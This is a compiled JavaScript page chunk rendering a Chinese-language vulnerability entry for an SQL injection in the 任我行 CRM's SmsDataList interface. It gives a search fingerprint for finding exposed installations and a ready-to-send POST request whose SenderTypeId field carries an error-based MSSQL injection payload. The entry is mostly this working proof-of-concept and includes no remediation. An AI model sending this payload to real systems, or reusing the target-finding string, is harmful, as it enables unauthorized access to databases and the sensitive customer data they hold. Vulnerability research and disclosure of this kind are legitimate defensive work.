(window.webpackJsonp=window.webpackJsonp||[]).push([[510],{2433:function(s,t,a){s.exports=a.p+"assets/img/1691823257291-6328f717-116f-4bc7-9f49-4bb4673487e1.95db0b6f.png"},2434:function(s,t,a){s.exports=a.p+"assets/img/1691823280317-687cb156-d2cf-4968-9095-891b429a60a2.77ecf2f9.png"},3318:function(s,t,a){"use strict";a.r(t);var r=a(64),e=Object(r.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"任我行-crm-smsdatalist-sql注入漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#任我行-crm-smsdatalist-sql注入漏洞"}},[s._v("#")]),s._v(" 任我行 CRM SmsDataList SQL注入漏洞")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("任我行 CRM SmsDataList 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意数据库语句，获取敏感信息")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("任我行 CRM")]),t("br"),s._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v('"欢迎使用任我行CRM"')]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("登陆页面")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2433),alt:"img"}})]),s._v(" "),t("p",[s._v("验证POC")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("SMS")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("SmsDataList"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("pageIndex"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("pageSize"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("30")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("HTTP")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nContent"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Type"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("x"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("www"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("form"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("urlencoded\nHost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" \n\nKeywords"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("StartSendDate"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2020")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("06")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("17")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("EndSendDate"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2020")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("09")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("17")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("SenderTypeId"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0000000000")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('")]),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("MD5")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("','")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("123456")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("')))) AND '")]),s._v("CvNI"),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'='")]),s._v("CvNI\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[t("img",{attrs:{src:a(2434),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=e.exports}}]);